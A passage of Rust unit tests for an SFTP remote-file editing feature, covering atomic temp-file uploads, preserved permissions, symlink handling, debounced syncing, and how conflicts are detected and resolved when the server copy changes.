        let sink = events.clone();
        let baseline = sftp
            .metadata(target)
            .await
            .map(|md| RemoteStamp::of(&md))
            .unwrap_or_default();
        let synced = synced_content.map(|c| format!("{:x}", Sha256::digest(c)));
        let sync = Arc::new(EditSync {
            sftp: Arc::new(sftp),
            session_id: "sess".into(),
            edit_id: "edit-1".into(),
            remote: "/link.conf".into(),
            target: target.into(),
            staged: crate::sftp::StagedCopy::new(local.to_path_buf()),
            mode,
            emit: Arc::new(move |payload| sink.lock().unwrap().push(payload)),
            stopped: std::sync::atomic::AtomicBool::new(false),
            debounce: EditDebounce::new(std::time::Duration::from_millis(80)),
            upload_lock: tokio::sync::Mutex::new(()),
            baseline: std::sync::Mutex::new(baseline),
            synced: std::sync::Mutex::new(synced),
            pending: std::sync::Mutex::new(None),
            retry: SyncRetry::default(),
        });
        (sync, events)
    }

    /// A hook run inside a Reload, and the edit id it is for.
    type ReloadHook = (String, Box<dyn FnOnce() + Send>);

    /// Hooks run inside a Reload right after its download (see
    /// `EditSync::resolve`), keyed by edit id: a test lands an "editor save"
    /// in exactly that window.
    static RELOAD_HOOKS: std::sync::Mutex<Vec<ReloadHook>> = std::sync::Mutex::new(Vec::new());

    thread_local! {
        /// Path resolutions (`canonical`, `system_path`) on this thread: the
        /// tests run in parallel, so each counts only its own.
        static RESOLUTIONS: std::cell::Cell<usize> = const { std::cell::Cell::new(0) };
    }

    pub(super) fn count_resolution() {
        RESOLUTIONS.with(|n| n.set(n.get() + 1));
    }

    #[cfg(unix)]
    fn reset_resolutions() {
        RESOLUTIONS.with(|n| n.set(0));
    }

    #[cfg(unix)]
    fn resolutions() -> usize {
        RESOLUTIONS.with(|n| n.get())
    }

    /// `(local path, step)` as `download_to_hashed` reaches them ("fsync" once
    /// the staged copy is on disk, "rename" just before it replaces `local`).
    static DOWNLOAD_STEPS: std::sync::Mutex<Vec<(String, &'static str)>> =
        std::sync::Mutex::new(Vec::new());

    pub(super) fn note_download_step(local: &str, step: &'static str) {
        DOWNLOAD_STEPS
            .lock()
            .unwrap()
            .push((local.to_string(), step));
    }

    /// The steps recorded for downloads into `local`, in order.
    #[cfg(unix)]
    fn download_steps(local: &str) -> Vec<&'static str> {
        DOWNLOAD_STEPS
            .lock()
            .unwrap()
            .iter()
            .filter(|(path, _)| path == local)
            .map(|(_, step)| *step)
            .collect()
    }

    pub(super) fn run_reload_hook(edit_id: &str) {
        let hook = {
            let mut hooks = RELOAD_HOOKS.lock().unwrap();
            hooks
                .iter()
                .position(|(id, _)| id == edit_id)
                .map(|i| hooks.remove(i).1)
        };
        if let Some(hook) = hook {
            hook();
        }
    }

    /// [`edit_sync_with`] for a session that knows nothing about the content.
    #[cfg(unix)]
    async fn edit_sync(
        sftp: russh_sftp::client::SftpSession,
        local: &std::path::Path,
        target: &str,
        mode: Option<u32>,
    ) -> (Arc<EditSync>, Arc<std::sync::Mutex<Vec<serde_json::Value>>>) {
        edit_sync_with(sftp, local, target, mode, None).await
    }

    #[cfg(unix)]
    fn tmp_opens(fx: &crate::sftp::testkit::Fixture) -> usize {
        fx.ops()
            .iter()
            .filter(|op| op.starts_with("open ") && op.contains(EDIT_TMP_SUFFIX))
            .count()
    }

    /// The upload never touches the live file until a complete copy exists:
    /// it goes to a temp name, is renamed over the original, and the original's
    /// permission bits survive the new inode.
    #[cfg(unix)]
    #[tokio::test]
    async fn edit_upload_swaps_a_complete_copy_in_and_keeps_the_mode() {
        use std::os::unix::fs::PermissionsExt;
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/deploy.sh", b"old");
        std::fs::set_permissions(
            fx.path("/srv/deploy.sh"),
            std::fs::Permissions::from_mode(0o750),
        )
        .unwrap();
        let local = LocalDir::new();
        let staged = local.0.join("staged.sh");
        std::fs::write(&staged, b"#!/bin/sh\necho new\n").unwrap();

        let up = upload_edited_file(&sftp, &staged, "/srv/deploy.sh", Some(0o750))
            .await
            .expect("upload");

        assert_eq!(up.bytes, 19);
        assert_eq!(up.stamp.size, Some(19), "the new file's own stamp");
        assert_eq!(fx.read("/srv/deploy.sh"), b"#!/bin/sh\necho new\n");
        assert_eq!(
            fx.mode("/srv/deploy.sh"),
            0o750,
            "executable bit must survive"
        );
        assert!(temps_in(&fx, "/srv").is_empty(), "no temp file left behind");
        let ops = fx.ops();
        assert!(
            ops[0].starts_with("open /srv/deploy.sh.sshspan-tmp"),
            "the first thing written is the temp file: {ops:?}"
        );
        assert!(
            !ops.iter().any(|op| op.starts_with("open /srv/deploy.sh ")),
            "the live file must never be opened for writing: {ops:?}"
        );
    }

    /// The failure the finding describes: the connection drops mid-sync. The
    /// live file is untouched, the temp copy is cleaned up, and the error is
    /// reported (it used to be swallowed after truncating the original).
    #[cfg(unix)]
    #[tokio::test]
    async fn failed_edit_upload_leaves_the_remote_file_untouched() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"precious original");
        fx.knobs.lock().unwrap().write_fail_at = Some(0);
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();

        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
            .await
            .expect_err("the write is refused");

        assert!(!err.is_empty());
        assert_eq!(fx.read("/srv/app.conf"), b"precious original");
        assert!(
            temps_in(&fx, "/srv").is_empty(),
            "partial temp file removed"
        );
        // The cleanup worked, so the message must not claim otherwise.
        assert!(!err.contains("left at"), "{err}");
    }

    /// When the partial temp file cannot be removed either, the user must be
    /// told where it is - it used to be left behind silently.
    #[cfg(unix)]
    #[tokio::test]
    async fn an_edit_upload_that_cannot_clean_up_names_the_leftover_temp_file() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"precious original");
        {
            let mut knobs = fx.knobs.lock().unwrap();
            knobs.write_fail_at = Some(0);
            knobs.fail_remove_containing = Some(EDIT_TMP_SUFFIX.to_string());
        }
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, vec![b'x'; 100_000]).unwrap();

        let err = upload_edited_file(&sftp, &staged, "/srv/app.conf", None)
            .await
            .expect_err("the write is refused");

        let tmp = opened_temp(&fx);
        assert!(
            err.contains(&format!("temp file left at {tmp}")),
            "the error must say where the leftover is: {err}"
        );
        assert!(fx.exists(&tmp), "it really was left behind");
        assert_eq!(fx.read("/srv/app.conf"), b"precious original");
    }

    /// Editing through a symbolic link must update the file it points at, not
    /// replace the link with a regular file.
    #[cfg(unix)]
    #[tokio::test]
    async fn edit_upload_through_a_symlink_updates_the_target() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/real.conf", b"old");
        fx.symlink("real.conf", "/link.conf");
        let target = sftp.canonicalize("/link.conf").await.unwrap();
        assert_eq!(target, "/real.conf");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"new").unwrap();

        upload_edited_file(&sftp, &staged, &target, None)
            .await
            .unwrap();

        assert_eq!(fx.read("/real.conf"), b"new");
        assert!(
            std::fs::symlink_metadata(fx.path("/link.conf"))
                .unwrap()
                .file_type()
                .is_symlink(),
            "the link must still be a link"
        );
    }

    /// Several saves in quick succession (and the several events of each) are
    /// ONE upload and ONE success event.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_burst_of_change_events_uploads_once_and_reports_once() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"old");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"edited").unwrap();
        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;

        let tasks: Vec<_> = (0..4)
            .map(|_| tokio::spawn(sync.clone().on_change()))
            .collect();
        for t in tasks {
            t.await.unwrap();
        }

        assert_eq!(
            tmp_opens(&fx),
            1,
            "one upload for the whole burst: {:?}",
            fx.ops()
        );
        assert_eq!(fx.read("/srv/app.conf"), b"edited");
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1, "{events:?}");
        assert_eq!(events[0]["ok"], true);
        assert_eq!(events[0]["remote"], "/link.conf");
    }

    /// A failed sync is REPORTED: the event says ok:false and why, so the UI
    /// can tell the user their save did not reach the server.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_failed_sync_emits_an_error_event() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"old");
        fx.knobs.lock().unwrap().write_fail_at = Some(0);
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, vec![b'y'; 50_000]).unwrap();
        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;

        sync.clone().on_change().await;

        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1);
        assert_eq!(events[0]["ok"], false);
        assert!(
            events[0]["error"].as_str().is_some_and(|e| !e.is_empty()),
            "{events:?}"
        );
        assert_eq!(fx.read("/srv/app.conf"), b"old");
    }

    /// Closing the edit (or the session) before the burst settles cancels the
    /// pending upload.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_stopped_watch_uploads_nothing() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"old");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"edited").unwrap();
        let (sync, events) = edit_sync(sftp, &staged, "/srv/app.conf", None).await;
        sync.stopped.store(true, Ordering::SeqCst);

        sync.clone().on_change().await;

        assert_eq!(tmp_opens(&fx), 0);
        assert!(events.lock().unwrap().is_empty());
        assert_eq!(fx.read("/srv/app.conf"), b"old");
    }

    // ─── RU6a item 5: a watcher overflow is a rescan ─────────────────────────

    /// notify 7 reports a queue overflow as an EVENT carrying the Rescan flag
    /// (`Ok`, not `Err`), and the old code took it for an unrelated event: a
    /// save whose events were lost in the overflow was never uploaded.
    #[test]
    fn ru6a_a_watcher_overflow_is_a_rescan_not_an_error() {
        use notify::event::{EventKind, Flag};
        let staged = std::ffi::OsStr::new("a.txt");
        let overflow = notify::Event::new(EventKind::Other).set_flag(Flag::Rescan);
        assert!(overflow.need_rescan());
        assert_eq!(
            watch_verdict(Ok(overflow), staged),
            Ok(WatchVerdict::Rescan)
        );
        // A rescan notice that names some other path is a rescan all the same.
        let named = watch_event(EventKind::Any, &["/d/other.txt"]).set_flag(Flag::Rescan);
        assert_eq!(watch_verdict(Ok(named), staged), Ok(WatchVerdict::Rescan));
    }

    /// The save's own events were lost in the overflow; the rescan finds the
    /// staged file differs from what the server holds, and syncs it.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_save_lost_to_a_watcher_overflow_still_syncs() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"original");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"edited while the watcher overflowed").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"original")).await;

        sync.clone().react(WatchVerdict::Rescan).await;

        assert_eq!(
            fx.read("/srv/app.conf"),
            b"edited while the watcher overflowed"
        );
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1, "{events:?}");
        assert_eq!(events[0]["ok"], true);
    }

    /// ...and a rescan that finds nothing changed uploads nothing.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_rescan_with_nothing_changed_uploads_nothing() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"same");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"same").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"same")).await;

        sync.clone().react(WatchVerdict::Rescan).await;

        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
        assert!(events.lock().unwrap().is_empty());
    }

    // ─── RU6a item 12: a remote change since the download is a conflict ──────

    /// An edit session opened on `v1`, then the server's copy changed by
    /// someone else and the local copy edited: (sync, events, fixture, the
    /// scratch dir, the staged path).
    #[cfg(unix)]
    async fn conflicted_edit() -> (
        Arc<EditSync>,
        Arc<std::sync::Mutex<Vec<serde_json::Value>>>,
        crate::sftp::testkit::Fixture,
        LocalDir,
        PathBuf,
    ) {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        fx.write("/srv/app.conf", b"v2, changed by someone else");
        std::fs::write(&staged, b"my edit").unwrap();
        (sync, events, fx, local, staged)
    }

    /// The next local save used to overwrite the other person's change
    /// without a word. It is a conflict now: nothing is uploaded, and the
    /// event says what the server holds.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_remote_change_since_the_download_is_a_conflict_not_an_overwrite() {
        let (sync, events, fx, _local, _staged) = conflicted_edit().await;

        sync.clone().on_change().await;

        assert_eq!(
            fx.read("/srv/app.conf"),
            b"v2, changed by someone else",
            "the other change was overwritten"
        );
        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1, "{events:?}");
        let e = &events[0];
        assert_eq!(
            (e["ok"].as_bool(), e["conflict"].as_bool()),
            (Some(false), Some(true)),
            "{e}"
        );
        assert_eq!(e["editId"], "edit-1");
        assert_eq!(e["remoteSize"], 27);
        assert!(e["remoteModifiedMs"].as_i64().is_some(), "{e}");
        assert_eq!(
            e["error"],
            "link.conf changed on the server since you opened it - choose Overwrite or Reload."
        );
    }

    /// "Overwrite" uploads the local copy over the server's version, and the
    /// session agrees with the server again: the next save goes straight in.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_overwrite_uploads_the_local_copy_and_takes_the_new_baseline() {
        let (sync, events, fx, _local, staged) = conflicted_edit().await;
        sync.clone().on_change().await;
        let id = conflict_id(&events);

        let result = sync
            .clone()
            .resolve(&id, EditResolution::Overwrite)
            .await
            .expect("overwrite");

        assert_eq!(result["action"], "overwrite", "{result}");
        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
        std::fs::write(&staged, b"my second edit").unwrap();
        sync.clone().on_change().await;
        assert_eq!(
            fx.read("/srv/app.conf"),
            b"my second edit",
            "no conflict with our own upload"
        );
        let kinds: Vec<(Option<bool>, Option<bool>)> = events
            .lock()
            .unwrap()
            .iter()
            .map(|e| (e["ok"].as_bool(), e["conflict"].as_bool()))
            .collect();
        assert_eq!(
            kinds,
            vec![
                (Some(false), Some(true)),
                (Some(true), None),
                (Some(true), None)
            ]
        );
    }

    /// "Reload" replaces the local copy with the server's version - and that
    /// rewrite of the staged file is not uploaded back as if it were a save.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_reload_replaces_the_local_copy_and_does_not_upload_it_back() {
        let (sync, events, fx, _local, staged) = conflicted_edit().await;
        sync.clone().on_change().await;
        let id = conflict_id(&events);

        let result = sync
            .clone()
            .resolve(&id, EditResolution::Reload)
            .await
            .expect("reload");

        assert_eq!(result["action"], "reload", "{result}");
        assert_eq!(
            std::fs::read(&staged).unwrap(),
            b"v2, changed by someone else"
        );
        // The watcher sees the reload rewrite the staged file: nothing to send.
        sync.clone().on_change().await;
        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
        // A real edit after the reload syncs without a conflict.
        std::fs::write(&staged, b"edited after the reload").unwrap();
        sync.clone().on_change().await;
        assert_eq!(fx.read("/srv/app.conf"), b"edited after the reload");
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 3, "{events:?}");
        assert_eq!(events[0]["conflict"], true);
        assert_eq!(
            (events[1]["ok"].as_bool(), events[1]["reloaded"].as_bool()),
            (Some(true), Some(true))
        );
        assert_eq!(events[2]["ok"], true);
    }

    /// The `conflictId` of the newest conflict event.
    #[cfg(unix)]
    fn conflict_id(events: &Arc<std::sync::Mutex<Vec<serde_json::Value>>>) -> String {
        events
            .lock()
            .unwrap()
            .iter()
            .rev()
            .find(|e| e["conflict"] == true)
            .and_then(|e| e["conflictId"].as_str())
            .map(str::to_string)
            .expect("a conflict event with an id")
    }

    // ─── RU6a fix 1, item 3: resolve needs a pending conflict ────────────────

    /// Overwrite/Reload used to be accepted with no conflict reported at all:
    /// a resolve is refused unless it names the conflict that is pending.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_resolve_is_refused_without_a_pending_conflict() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"local edit").unwrap();
        let (sync, _events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;

        for action in [EditResolution::Overwrite, EditResolution::Reload] {
            let err = sync
                .clone()
                .resolve("made-up", action)
                .await
                .expect_err("nothing to resolve");
            assert_eq!(err, "There is no conflict to resolve for this file.");
        }
        assert_eq!(fx.read("/srv/app.conf"), b"v1");
        assert_eq!(std::fs::read(&staged).unwrap(), b"local edit");
    }

    /// The proven scenario: the event showed Bob's v2, Bob saved v3, and
    /// Alice's Overwrite then replaced v3 without a word. The Overwrite checks
    /// the server again and reports a FRESH conflict instead.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_overwrite_after_another_remote_change_reports_a_fresh_conflict() {
        let (sync, events, fx, _local, _staged) = conflicted_edit().await;
        sync.clone().on_change().await;
        let first = conflict_id(&events);
        fx.write("/srv/app.conf", b"v3 - Bob saved again, longer");

        let result = sync
            .clone()
            .resolve(&first, EditResolution::Overwrite)
            .await
            .expect("a fresh conflict is a result, not an error");

        assert_eq!(fx.read("/srv/app.conf"), b"v3 - Bob saved again, longer");
        assert_eq!(result["ok"], false, "{result}");
        assert_eq!(result["conflict"], true, "{result}");
        let second = conflict_id(&events);
        assert_ne!(second, first, "a new conflict, a new id");
        assert_eq!(result["conflictId"], second.as_str(), "{result}");
        assert_eq!(result["remoteSize"], 28, "{result}");
        // The old id is spent; the new one works.
        assert_eq!(
            sync.clone()
                .resolve(&first, EditResolution::Overwrite)
                .await
                .expect_err("stale id"),
            "That conflict was replaced by a newer one - choose again on the newest message."
        );
        sync.clone()
            .resolve(&second, EditResolution::Overwrite)
            .await
            .expect("overwrite");
        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
        // Resolved: nothing pending any more.
        assert!(sync
            .clone()
            .resolve(&second, EditResolution::Reload)
            .await
            .is_err());
    }

    // ─── RU6a fix 1, item 4: a file deleted on the server while edited ──────

    /// Every save used to report "Could not check ... No such file ... Save
    /// again to retry" - forever. It is a conflict ("deleted"), and Overwrite
    /// puts the copy back.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_file_deleted_on_the_server_is_a_conflict_that_overwrite_resolves() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        std::fs::remove_file(fx.path("/srv/app.conf")).unwrap();
        std::fs::write(&staged, b"my edit").unwrap();

        sync.clone().on_change().await;

        let e = events.lock().unwrap().last().cloned().unwrap();
        assert_eq!(e["conflict"], true, "{e}");
        assert_eq!(e["reason"], "deleted", "{e}");
        assert!(
            e["remoteSize"].is_null() && e["remoteModifiedMs"].is_null(),
            "{e}"
        );
        assert!(!fx.exists("/srv/app.conf"));
        let id = conflict_id(&events);
        let err = sync
            .clone()
            .resolve(&id, EditResolution::Reload)
            .await
            .expect_err("nothing to reload");
        assert!(err.contains("deleted on the server"), "{err}");
        sync.clone()
            .resolve(&id, EditResolution::Overwrite)
            .await
            .expect("overwrite puts it back");
        assert_eq!(fx.read("/srv/app.conf"), b"my edit");
    }

    // ─── RU6a fix 1, item 5: Reload records the bytes it downloaded ─────────

    /// An editor save landing right after Reload's rename was hashed as if it
    /// were the server's content - recorded as synced, never uploaded.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_an_editor_save_during_reload_is_still_uploaded() {
        let (sync, events, fx, _local, staged) = conflicted_edit().await;
        sync.clone().on_change().await;
        let id = conflict_id(&events);
        let saved_meanwhile = staged.clone();
        RELOAD_HOOKS.lock().unwrap().push((
            "edit-1".to_string(),
            Box::new(move || std::fs::write(&saved_meanwhile, b"typed during the reload").unwrap()),
        ));

        sync.clone()
            .resolve(&id, EditResolution::Reload)
            .await
            .expect("reload");
        sync.clone().on_change().await;

        assert_eq!(fx.read("/srv/app.conf"), b"typed during the reload");
    }

    // ─── RU6a fix 1, item 6: the open-time baseline ──────────────────────────

    /// The baseline came from a separate STAT whose failure was swallowed
    /// (`.ok()`): a STAT that failed once left a blank baseline, so the next
    /// save compared with nothing. It is the download's own STAT now - if
    /// that fails, the open fails (nothing is staged); a retry then gets the
    /// real baseline.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_the_open_time_baseline_comes_from_the_download() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1 content");
        fx.knobs.lock().unwrap().stat_refusals_left = 1;
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");

        let err = stage_for_edit(&sftp, "/srv/app.conf", &staged)
            .await
            .err()
            .expect("no session without a baseline");
        assert!(err.contains("Permission denied"), "{err}");
        assert!(!staged.exists(), "nothing staged");
        let edit = stage_for_edit(&sftp, "/srv/app.conf", &staged)
            .await
            .expect("staged");

        let real = std::fs::metadata(fx.path("/srv/app.conf")).unwrap();
        assert_eq!(edit.baseline.size, Some(10));
        assert_eq!(
            edit.baseline.mtime,
            Some(
                real.modified()
                    .unwrap()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_secs() as u32
            )
        );
        assert_eq!(std::fs::read(&staged).unwrap(), b"v1 content");
    }

    /// A server that reports neither size nor time made every remote change
    /// invisible (unknown == unknown). The content is compared instead.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_without_size_or_time_a_remote_change_is_found_by_content() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        fx.knobs.lock().unwrap().strip_size_mtime = true;
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;

        // Unchanged on the server: the save goes in.
        std::fs::write(&staged, b"edit one").unwrap();
        sync.clone().on_change().await;
        assert_eq!(fx.read("/srv/app.conf"), b"edit one");
        // Changed on the server: a conflict, nothing uploaded.
        fx.write("/srv/app.conf", b"changed by someone");
        std::fs::write(&staged, b"edit two").unwrap();
        sync.clone().on_change().await;
        assert_eq!(
            fx.read("/srv/app.conf"),
            b"changed by someone",
            "{:?} {:?}",
            events.lock().unwrap(),
            fx.ops()
        );
        let last = events.lock().unwrap().last().cloned().unwrap();
        assert_eq!(last["conflict"], true, "{last}");
    }

    // ─── RU6a fix 1, item 13: a periodic look at the staged copy ────────────

    /// notify's Windows backend never reports an overflow, so a save whose
    /// events were lost there was never uploaded. A periodic check of the
    /// staged copy syncs it anyway - here with no watcher event at all.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_save_no_watcher_reported_is_synced_by_the_periodic_check() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"v1").unwrap();
        let (sync, _events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        let task = tokio::spawn(periodic_rescan(
            Arc::downgrade(&sync),
            std::time::Duration::from_millis(100),
        ));

        std::fs::write(&staged, b"saved, but no event arrived").unwrap();
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
        while fx.read("/srv/app.conf") != b"saved, but no event arrived"
            && std::time::Instant::now() < deadline
        {
            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }
        assert_eq!(fx.read("/srv/app.conf"), b"saved, but no event arrived");
        // Ending the edit ends the check.
        sync.end();
        tokio::time::timeout(std::time::Duration::from_secs(2), task)
            .await
            .expect("the periodic check stops with the edit")
            .unwrap();
    }

    /// A STAT that fails before a sync-back must not turn into a blind upload.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_a_failed_check_before_a_sync_back_is_reported_not_uploaded() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"my edit").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;
        fx.knobs
            .lock()
            .unwrap()
            .stat_refused
            .push("/srv/app.conf".to_string());

        sync.clone().on_change().await;

        assert_eq!(fx.read("/srv/app.conf"), b"v1");
        assert_eq!(tmp_opens(&fx), 0, "{:?}", fx.ops());
        let events = events.lock().unwrap();
        assert_eq!(events.len(), 1, "{events:?}");
        assert_eq!(events[0]["ok"], false);
        assert!(events[0].get("conflict").is_none(), "{}", events[0]);
        let error = events[0]["error"].as_str().unwrap_or_default();
        assert!(
            error.contains("Could not check link.conf on the server")
                && error.contains("not uploaded"),
            "{error}"
        );
    }

    /// Two saves in a row: the second is compared with what the FIRST upload
    /// left on the server, not with the download - no false conflict.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_two_saves_in_a_row_do_not_conflict_with_our_own_upload() {
        let (sftp, fx) = crate::sftp::testkit::serve().await;
        fx.write("/srv/app.conf", b"v1");
        let local = LocalDir::new();
        let staged = local.0.join("staged.conf");
        std::fs::write(&staged, b"one").unwrap();
        let (sync, events) =
            edit_sync_with(sftp, &staged, "/srv/app.conf", None, Some(b"v1")).await;

        sync.clone().on_change().await;
        std::fs::write(&staged, b"two, longer").unwrap();
        sync.clone().on_change().await;

        assert_eq!(fx.read("/srv/app.conf"), b"two, longer");
        let events = events.lock().unwrap();
        assert!(
            events.len() == 2 && events.iter().all(|e| e["ok"] == true),
            "{events:?}"
        );
    }

    /// The resolve command's two actions; anything else is refused by name.
    #[test]
    fn ru6a_edit_resolutions_are_overwrite_or_reload() {
        assert_eq!(
            EditResolution::parse("overwrite"),
            Ok(EditResolution::Overwrite)
        );
        assert_eq!(EditResolution::parse("reload"), Ok(EditResolution::Reload));
        assert_eq!(
            EditResolution::parse("merge"),
            Err("Unknown action \"merge\" - expected \"overwrite\" or \"reload\".".to_string())
        );
    }

    // ─── RU6a item 6: ending an edit discards its staged copy ────────────────

    /// Closing an edit, closing its session and locking the vault each end the
    /// session (found by its id until then) and discard its staged copy.
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_ending_an_edit_session_discards_its_staged_copy() {
        let registry = EditRegistry::new();
        let local = LocalDir::new();
        let mut staged_paths = Vec::new();
        let mut fixtures = Vec::new();
        for (key, session, edit_id) in [
            ("s1:/a", "s1", "edit-a"),
            ("s1:/b", "s1", "edit-b"),
            ("s2:/c", "s2", "edit-c"),
        ] {
            let (sftp, fx) = crate::sftp::testkit::serve().await;
            let path = local.0.join(edit_id);
            std::fs::write(&path, b"remote secret").unwrap();
            let sync = bare_sync(sftp, session, edit_id, &path);
            registry.insert(
                key.into(),
                EditWatch {
                    session_id: session.into(),
                    watcher: None,
                    sync,
                },
            );
            staged_paths.push(path);
            fixtures.push(fx);
        }
        assert!(registry.find("edit-c").is_some());
        assert!(registry.find("no-such-edit").is_none());

        assert!(registry.stop("s1:/a"));
        assert!(!staged_paths[0].exists());
        assert!(!registry.stop("s1:/a"), "already stopped");
        registry.stop_all_for_session("s1");
        assert!(!staged_paths[1].exists());
        assert!(staged_paths[2].exists(), "another session's edit stays");
        registry.stop_all();
        assert!(!staged_paths[2].exists());
        assert!(registry.find("edit-c").is_none());
    }

    /// An `EditSync` with no baseline and no events, for registry tests.
    #[cfg(unix)]
    fn bare_sync(
        sftp: russh_sftp::client::SftpSession,
        session: &str,
        edit_id: &str,
        path: &std::path::Path,
    ) -> Arc<EditSync> {
        Arc::new(EditSync {
            sftp: Arc::new(sftp),
            session_id: session.into(),
            edit_id: edit_id.into(),
            remote: format!("/{edit_id}"),
            target: format!("/{edit_id}"),
            staged: crate::sftp::StagedCopy::new(path.to_path_buf()),
            mode: None,
            emit: Arc::new(|_| {}),
            stopped: std::sync::atomic::AtomicBool::new(false),
            debounce: EditDebounce::new(std::time::Duration::from_millis(80)),
            upload_lock: tokio::sync::Mutex::new(()),
            baseline: std::sync::Mutex::new(RemoteStamp::default()),
            synced: std::sync::Mutex::new(None),
            pending: std::sync::Mutex::new(None),
            retry: SyncRetry::default(),
        })
    }

    // ─── RU6a fix 1, item 18: two opens of one file ──────────────────────────

    /// Two `sftp_open_for_edit` calls for the same file: the second insert
    /// dropped the first watch without ending it - its staged copy lingered and
    /// its saves stopped syncing without a word. A replaced session is ended
    /// properly, and an open session is found by its key (so a second open can
    /// reuse it).
    #[cfg(unix)]
    #[tokio::test]
    async fn ru6a_fix1_a_second_session_for_one_file_ends_the_first_properly() {
        let registry = EditRegistry::new();
        let local = LocalDir::new();
        let (sftp_a, _fa) = crate::sftp::testkit::serve().await;
        let (sftp_b, _fb) = crate::sftp::testkit::serve().await;
        let first_path = local.0.join("first");
        let second_path = local.0.join("second");
        std::fs::write(&first_path, b"x").unwrap();
        std::fs::write(&second_path, b"x").unwrap();
